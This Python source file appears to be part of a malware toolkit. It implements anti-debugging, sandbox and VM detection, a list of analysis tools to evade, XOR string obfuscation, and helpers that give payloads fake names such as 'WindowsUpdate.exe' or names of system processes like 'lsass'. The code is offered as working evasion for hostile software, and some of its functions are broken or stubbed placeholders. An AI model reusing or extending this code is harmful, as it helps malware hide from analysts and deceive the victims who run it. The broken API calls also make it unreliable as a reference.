"""
Unified Evasion Module
Combines anti-debugging, anti-VM, obfuscation, and self-protection techniques
"""
import os
import sys
import time
import random
import string
import hashlib
import subprocess
import platform
from datetime import datetime
from typing import List, Dict, Any, Optional

# Windows-specific imports
try:
    import win32api
    import win32con
    import win32process
    import win32security
    import wmi
    WINDOWS_EVASION = True
except ImportError:
    WINDOWS_EVASION = False


class EvasionManager:
    """Unified evasion and anti-analysis manager"""
    
    def __init__(self):
        self.evasion_enabled = True
        self.debug_detected = False
        self.vm_detected = False
        self.analysis_detected = False
        
        # Known analysis tools and processes
        self.analysis_processes = [
            "ollydbg", "x64dbg", "windbg", "ida", "ida64", "idaq", "idaq64",
            "immunitydebugger", "wireshark", "fiddler", "burpsuite", "procmon",
            "procexp", "regmon", "filemon", "vmmap", "pview", "listdlls",
            "tcpview", "autoruns", "sigcheck", "strings", "depends", "peid",
            "pestudio", "exeinfope", "die", "protection_id", "vmware",
            "virtualbox", "vbox", "qemu", "bochs", "sandboxie", "cuckoo",
            "anubis", "threatexpert", "joebox", "malwr", "hybrid-analysis"
        ]
        
        # VM/Sandbox indicators
        self.vm_indicators = {
            "processes": ["vmware", "vbox", "qemu", "sandboxie", "cuckoo"],
            "files": [
                "C:\\windows\\system32\\drivers\\vmhgfs.sys",
                "C:\\windows\\system32\\drivers\\vboxmouse.sys", 
                "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
                "C:\\windows\\system32\\drivers\\vmtoolsd.exe"
            ],
            "registry": [
                "HARDWARE\\Description\\System\\SystemBiosVersion",
                "HARDWARE\\Description\\System\\VideoBiosVersion"
            ],
            "usernames": ["sandbox", "malware", "analyst", "virus", "test"]
        }
    
    # ========================================
    # ANTI-DEBUGGING TECHNIQUES
    # ========================================
    
    def check_debugger_present(self) -> bool:
        """Check for debugger presence using multiple methods"""
        if not WINDOWS_EVASION:
            return False
        
        try:
            # Method 1: IsDebuggerPresent API
            if win32api.IsDebuggerPresent():
                self.debug_detected = True
                return True
            
            # Method 2: CheckRemoteDebuggerPresent
            current_process = win32api.GetCurrentProcess()
            debug_present = win32process.IsProcessInJob(current_process, None)
            
            # Method 3: NtGlobalFlag check
            # Method 4: BeingDebugged flag in PEB
            # (These would require more advanced techniques)
            
            return False
            
        except Exception:
            return False
    
    def anti_debug_timing(self) -> bool:
        """Detect debugger using timing checks"""
        try:
            start_time = time.perf_counter()
            
            # Perform some operations
            dummy = sum(range(1000))
            
            end_time = time.perf_counter()
            execution_time = end_time - start_time
            
            # If execution takes too long, might be debugged
            if execution_time > 0.01:  # 10ms threshold
                self.debug_detected = True
                return True
                
        except Exception:
            pass
        
        return False
    
    def check_analysis_processes(self) -> bool:
        """Check for known analysis tools"""
        try:
            if WINDOWS_EVASION:
                c = wmi.WMI()
                processes = c.Win32_Process()
                
                running_processes = [p.Name.lower() for p in processes if p.Name]
                
                for analysis_proc in self.analysis_processes:
                    if any(analysis_proc in proc for proc in running_processes):
                        self.analysis_detected = True
                        return True
            else:
                # Cross-platform process check
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                running_processes = result.stdout.lower()
                
                for analysis_proc in self.analysis_processes:
                    if analysis_proc in running_processes:
                        self.analysis_detected = True
                        return True
        except Exception:
            pass
        
        return False
    
    # ========================================
    # ANTI-VM TECHNIQUES  
    # ========================================
    
    def check_vm_processes(self) -> bool:
        """Check for VM-related processes"""
        try:
            if WINDOWS_EVASION:
                c = wmi.WMI()
                processes = c.Win32_Process()
                running_processes = [p.Name.lower() for p in processes if p.Name]
            else:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                running_processes = result.stdout.lower().split()
            
            for vm_proc in self.vm_indicators["processes"]:
                if any(vm_proc in proc for proc in running_processes):
                    self.vm_detected = True
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def check_vm_files(self) -> bool:
        """Check for VM-related files"""
        try:
            for vm_file in self.vm_indicators["files"]:
                if os.path.exists(vm_file):
                    self.vm_detected = True
                    return True
        except Exception:
            pass
        
        return False
    
    def check_vm_registry(self) -> bool:
        """Check registry for VM indicators"""
        if not WINDOWS_EVASION:
            return False
        
        try:
            import winreg
            
            for reg_path in self.vm_indicators["registry"]:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    value, _ = winreg.QueryValueEx(key, "")
                    winreg.CloseKey(key)
                    
                    # Check for VM-related strings in registry values
                    if any(vm in value.lower() for vm in ["vmware", "vbox", "qemu", "virtual"]):
                        self.vm_detected = True
                        return True
                except:
                    continue
        except Exception:
            pass
        
        return False
    
    def check_vm_environment(self) -> bool:
        """Check environment for VM indicators"""
        try:
            # Check username
            username = os.environ.get('USERNAME', '').lower()
            if any(vm_user in username for vm_user in self.vm_indicators["usernames"]):
                self.vm_detected = True
                return True
            
            # Check computer name
            computer_name = os.environ.get('COMPUTERNAME', '').lower()
            if any(vm_name in computer_name for vm_name in ["sandbox", "malware", "vm"]):
                self.vm_detected = True
                return True
            
            # Check system information
            system_info = platform.uname()
            system_str = ' '.join(system_info).lower()
            
            if any(vm_indicator in system_str for vm_indicator in ["vmware", "virtualbox", "qemu"]):
                self.vm_detected = True
                return True
                
        except Exception:
            pass
        
        return False
    
    # ========================================
    # OBFUSCATION TECHNIQUES
    # ========================================
    
    def obfuscate_string(self, text: str) -> str:
        """Simple string obfuscation"""
        try:
            # XOR with random key
            key = random.randint(1, 255)
            obfuscated = ''.join(chr(ord(char) ^ key) for char in text)
            return f"{key}:{obfuscated}"
        except Exception:
            return text
    
    def deobfuscate_string(self, obfuscated: str) -> str:
        """Deobfuscate string"""
        try:
            if ':' not in obfuscated:
                return obfuscated
            
            key_str, encrypted = obfuscated.split(':', 1)
            key = int(key_str)
            
            return ''.join(chr(ord(char) ^ key) for char in encrypted)
        except Exception:
            return obfuscated
    
    def generate_random_string(self, length: int = 10) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def obfuscate_api_calls(self):
        """Obfuscate API calls (placeholder for advanced techniques)"""
        # This would implement more advanced API obfuscation
        pass
    
    # ========================================
    # SELF-PROTECTION TECHNIQUES
    # ========================================
    
    def protect_process(self) -> bool:
        """Implement process protection techniques"""
        if not WINDOWS_EVASION:
            return False
        
        try:
            # Get current process handle
            current_process = win32api.GetCurrentProcess()
            
            # Try to set process as critical (requires privileges)
            try:
                # This would require SeDebugPrivilege
                win32security.SetProcessWindowStation(current_process)
            except:
                pass
            
            return True
        except Exception:
            return False
    
    def enable_dep_protection(self) -> bool:
        """Enable DEP (Data Execution Prevention)"""
        if not WINDOWS_EVASION:
            return False
        
        try:
            # Enable DEP for current process
            win32process.SetProcessDEPPolicy(win32con.PROCESS_DEP_ENABLE)
            return True
        except Exception:
            return False
    
    def check_integrity(self) -> bool:
        """Check file integrity"""
        try:
            # Get current executable path
            exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Calculate hash
            with open(exe_path, 'rb') as f:
                content = f.read()
                current_hash = hashlib.sha256(content).hexdigest()
            
            # In a real implementation, you'd compare against a known good hash
            # For now, just return True
            return True
            
        except Exception:
            return False
    
    # ========================================
    # SOCIAL ENGINEERING HELPERS
    # ========================================
    
    def generate_legitimate_filename(self) -> str:
        """Generate a legitimate-looking filename"""
        legitimate_names = [
            "WindowsUpdate.exe", "SecurityUpdate.exe", "SystemUpdate.exe",
            "MicrosoftUpdate.exe", "DefenderUpdate.exe", "ChromeUpdate.exe",
            "AdobeUpdate.exe", "JavaUpdate.exe", "FlashUpdate.exe"
        ]
        return random.choice(legitimate_names)
    
    def generate_legitimate_process_name(self) -> str:
        """Generate a legitimate-looking process name"""
        legitimate_processes = [
            "svchost", "explorer", "winlogon", "services", "lsass",
            "dwm", "audiodg", "conhost", "csrss", "wininit"
        ]
        return random.choice(legitimate_processes)
    
    # ========================================
    # MAIN EVASION CHECKS
    # ========================================
    
    def run_evasion_checks(self) -> Dict[str, Any]:
        """Run comprehensive evasion checks"""
        if not self.evasion_enabled:
            return {"safe": True, "message": "Evasion checks disabled"}
        
        print("[*] Running evasion and safety checks...")
        
        checks = {
            "debugger_present": self.check_debugger_present(),
            "timing_anomaly": self.anti_debug_timing(), 
            "analysis_tools": self.check_analysis_processes(),
            "vm_processes": self.check_vm_processes(),
            "vm_files": self.check_vm_files(),
            "vm_registry": self.check_vm_registry(),
            "vm_environment": self.check_vm_environment()
        }
        
        # Determine if environment is safe
        threats_detected = sum(checks.values())
        safe = threats_detected == 0
        
        result = {
            "safe": safe,
            "checks": checks,
            "threats_detected": threats_detected,
            "debug_detected": self.debug_detected,
            "vm_detected": self.vm_detected,
            "analysis_detected": self.analysis_detected
        }
        
        if not safe:
            print(f"[!] Threats detected: {threats_detected}")
            print("[!] Environment may not be safe for operation")
        else:
            print("[+] Environment appears safe")
        
        return result
    
    def should_exit(self) -> bool:
        """Determine if application should exit based on threats"""
        checks = self.run_evasion_checks()
        return not checks["safe"]
    
    def safe_exit(self, message: str = "Exiting for safety"):
        """Safely exit application"""
        print(f"[!] {message}")
        
        # Clean up any traces
        try:
            # Clear some memory
            import gc
            gc.collect()
            
            # Random delay
            time.sleep(random.uniform(0.1, 1.0))
            
        except Exception:
            pass
        
        sys.exit(0)


# Global evasion manager instance
evasion_manager = EvasionManager()

# Legacy function compatibility
def check_debugger():
    """Legacy interface for debugger check"""
    return evasion_manager.check_debugger_present()

def check_vm():
    """Legacy interface for VM check"""
    return (evasion_manager.check_vm_processes() or 
            evasion_manager.check_vm_files() or
            evasion_manager.check_vm_registry() or
            evasion_manager.check_vm_environment())

def check_analysis_tools():
    """Legacy interface for analysis tools check"""
    return evasion_manager.check_analysis_processes()

def run_all_checks():
    """Legacy interface for all checks"""
    return evasion_manager.run_evasion_checks()

def is_safe_environment():
    """Legacy interface for safety check"""
    result = evasion_manager.run_evasion_checks()
    return result["safe"]

def obfuscate_string(text):
    """Legacy interface for string obfuscation"""
    return evasion_manager.obfuscate_string(text)

def deobfuscate_string(text):
    """Legacy interface for string deobfuscation"""
    return evasion_manager.deobfuscate_string(text)